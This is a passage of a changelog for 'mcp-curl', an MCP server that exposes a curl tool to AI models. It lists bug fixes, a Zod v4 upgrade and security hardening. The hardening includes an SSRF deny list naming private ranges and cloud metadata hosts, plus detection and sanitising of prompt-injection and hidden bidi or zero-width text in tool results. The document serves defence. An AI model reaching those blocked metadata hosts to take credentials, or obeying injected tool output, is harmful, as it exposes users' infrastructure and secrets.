  bounded fixed-point loop and a body-shape sniffer for tampered Content-Types. Injection detection
  now normalises NFKC before matching and logs (never redacts) to stderr.

- **Defence-in-depth response wrap** on YAML endpoints, custom tools and hook short-circuit returns
  (PR-6b), so every tool result routes through one post-processor.

- **YAML schemas sanitised at parse time** (PR-6a), closing an `ApiSchemaValidator` bypass: bidi and
  zero-width bytes can no longer reach the LLM or appear in Zod error messages.

- **`registerCustomTool()` auto-sanitises `inputSchema` field descriptions** at every depth (PR-5),
  recursing through all Zod wrapper and container types while preserving runtime invariants.

- **HTTP auth-token validation** (PR-4): `MCP_AUTH_TOKEN` must be printable ASCII and ≤4096 chars;
  the rejected token is never echoed, and bearer comparison is timing-safe.

- URL helper hardening and public-barrel symmetry (PR-1); `executeJqQuery` unit tests (PR-2);
  architecture overview and integration-test script.

### Fixed

- **`jq_filter` no longer silently misreads unsupported jq syntax.** The bare-key scanner in
  `parseJqFilter()` treated any character that was not `.` or `[` as part of a key name, so a real jq
  expression was absorbed into a key, missed, and resolved to `null`. `.data | {id, name}` returned
  `[null, null]` and `.data | {id}` returned `undefined`, with no indication that the syntax was never
  supported. Such filters now throw an error naming the offending character and listing what is
  supported. Hyphens and underscores in bare keys (`.content-type`, `.assignee_user_ids`) and bracket
  notation (`.["a|b: {c}"]`) are unaffected.

- **`applyJqFilter()` / `applyJqFilterToParsed()` no longer return `undefined`.** `JSON.stringify(undefined)`
  is `undefined`, not a string, so a missing key leaked a non-string value out of a function declared to
  return `string`. A missing path now yields the string `"null"`, matching jq's output for an absent path.
  `applySingleJqFilter()` keeps its documented `undefined`-for-missing-key contract.

- **Iterate-and-project (`.items[].id`) is now rejected instead of returning `null`.** `[]` is an array
  passthrough, not jq's iterate, so a key lookup after it landed on the array and silently resolved to
  `null`. A trailing `[]` still works; use an explicit index or slice to project.

### Documentation

- `docs/api-schema.md` advertised `jqFilter: ".data | {id, name}"` and `".data | {id}"` in two
  `filterPresets` examples. Neither could ever work — both are now supported path syntax, and the
  Response Configuration section states plainly what `jqFilter` does and does not support.

- `README.md` documents the `[]` passthrough and states that jq expression syntax is rejected.

## [3.0.0] - 2026-04-03

### Breaking Changes

- **Zod v4 upgrade** – `zod` dependency bumped from `^3.23.8` to `^4.0.0`. Consumers who have their own
  `zod@^3.x` dependency and use exported types from `mcp-curl` (e.g. `CurlExecuteInput`, `JqQueryInput`,
  `ApiSchemaValidationError`) will encounter TypeScript type mismatches. Pin your `zod` dependency to v4 or use
  type-only imports where possible.

- **`ApiSchemaValidationError.issues` type changed** – The `issues` property on `ApiSchemaValidationError` now
  carries Zod v4's `ZodIssue` type. The `invalid_type` issue no longer includes a `received` field. Code
  pattern-matching on issue structure may need updates.

- **URL validation error code changed** – Zod v4 `z.url()` emits `invalid_format` instead of `invalid_string`
  for URL format failures. Code matching on `issue.code === "invalid_string"` for URL fields will no longer match.
  Update to `issue.code === "invalid_format"`.

### Changed

- **`@modelcontextprotocol/sdk` bumped** from `^1.12.0` to `^1.29.0`. No breaking API changes in the tool
  registration surface (`server.registerTool()` is unchanged).

- **`z.string().url()` → `z.url()`** at all validation sites. The HTTP/HTTPS protocol `.refine()` guard on
  `CurlExecuteSchema.url` is preserved.

- **`z.record(z.string())` → `z.record(z.string(), z.string())`** for `headers` and `form` fields. The
  single-argument form builds silently in Zod v4 but crashes at parse time.

## [2.0.1] - 2026-02-17

### Security

- **cURL protocol restriction** – Added `--proto=http,https` to all requests as defense-in-depth alongside URL
  validation, preventing protocol confusion between Node's URL parser and cURL's parser

- **cURL size abort** – Added `--max-filesize` (10MB) to abort early when `Content-Length` exceeds the limit (cURL exit
  code 63), before data streams into Node. Chunked/streaming responses without Content-Length still rely on the
  Node-level backstop in `command-executor.ts`

- **Minimal error logging** – Server-side `console.error` now logs only `[hostname]` or `[filename]` with error class
  name. Previously could leak auth headers from `-v` mode, URLs with tokens, cURL stderr fragments, file content
  snippets, or system paths. User-facing error messages are unchanged

## [1.1.5] - 2026-01-27

### Added

- **New `jq_query` tool** - Query saved JSON files without making new HTTP requests
    - Restricted to safe directories (temp, output_dir, cwd)
    - 10MB file size limit
    - Same jq_filter syntax as curl_execute

- **Large response handling** – Automatic handling of responses up to 10MB
    - `jq_filter` parameter for extracting specific JSON data
    - Dot notation for arrays (`.results.0` same as `.results[0]`)
    - Multiple paths support (`.name,.email` returns array, max 20 paths)
    - Array slicing (`.users[0:5]`)
    - Auto-save to file when result exceeds `max_result_size` (default 500KB)
    - `save_to_file` parameter for explicit file saving
    - `output_dir` parameter with `MCP_CURL_OUTPUT_DIR` env var fallback

### Security

- **SSRF protection** – Blocks requests to private networks and internal hosts
    - Private IP ranges: 10.x, 172.16-31.x, 192.168.x, 169.254.x
    - IPv4-mapped IPv6 addresses
    - IPv6 private ranges (loopback, link-local, unique local)
    - Internal TLDs: .local, .internal, .corp, .lan, .localhost (case-insensitive)
    - Cloud metadata hostnames: `metadata.google.internal`, `instance-data.ec2.internal`, `metadata.azure.com`
    - DNS rebinding services: `*.nip.io`, `*.sslip.io`, `*.xip.io`

- **DNS rebinding prevention** – DNS resolved before validation, cURL pinned to validated IP via `--resolve`

- **Protocol whitelist** - Only `http://` and `https://` allowed; `file://`, `ftp://`, UNC paths blocked

- **Symlink security** – All paths resolved via `realpath()` before validation to prevent symlink escape attacks

- **Path traversal protection** - Explicit `..` blocking in both `output_dir` and `filepath` parameters

- **Authentication** – Optional bearer token via `MCP_AUTH_TOKEN` env var for HTTP transport

- **Rate limiting** – Dual limits prevent abuse
    - Per-hostname: 60 requests/minute
    - Per-client: 300 requests/minute total

- **Resource limits**
    - jq filter parsing timeout: 100ms (prevents ReDoS)
    - Global memory limit: 100MB across concurrent requests
    - Session idle timeout: 1 hour with automatic cleanup

- **Command allowlist** – `executeCommand()` restricted to `"curl"` only via TypeScript literal type and runtime guard

- **Input validation**
    - CRLF injection protection for headers, user-agent, auth values
    - Per-request unique metadata separator prevents response injection
    - Strict jq_filter validation (unclosed quotes/brackets, leading zeros, safe integer bounds)

- **Localhost access** – Blocked by default; `MCP_CURL_ALLOW_LOCALHOST=true` enables with port restrictions

### Changed

- Maximum response size increased to 10MB for processing (inline result limit remains configurable)
- Negative indices are no longer supported in jq_filter for simplicity and security

## [1.0.2] - 2026-01-23

### Changed

- Increased the maximum response size from 1MB to 4MB to support larger API responses

## [1.0.0] - 2025-12-12

### Added

- Initial release
- `curl_execute` tool for structured HTTP requests with typed parameters
- Support for common HTTP methods (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS)
- Authentication options (basic auth, bearer token)
- Request customization (headers, body, form data, user agent)
- Response options (follow redirects, include headers, compressed responses)
- Timeout configuration (1-300 seconds)
- SSL verification control
- JSON metadata output option
- Built-in API documentation resource (`curl://docs/api`)
- Prompt templates for API testing and discovery
- Stdio and HTTP transport support
- Session management for HTTP transport